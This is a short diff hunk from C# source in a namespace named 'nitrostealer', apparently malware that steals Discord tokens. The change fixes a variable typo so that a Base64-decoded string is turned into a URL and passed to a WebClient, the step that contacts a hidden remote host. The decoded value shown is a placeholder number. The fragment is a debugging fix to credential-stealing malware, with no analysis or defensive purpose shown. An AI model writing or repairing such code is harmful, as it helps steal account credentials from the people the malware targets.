@@ -100,7 +100,7 @@ namespace nitrostealer
 
 
                 byte[] datas = Convert.FromBase64String("1488");
-                string decodedStrings = Encoding.UTF8.GetString(data);
+                string decodedStrings = Encoding.UTF8.GetString(datas);
 
                 WebClient client_ = new WebClient();
                 Uri link_ = new Uri(decodedStrings);
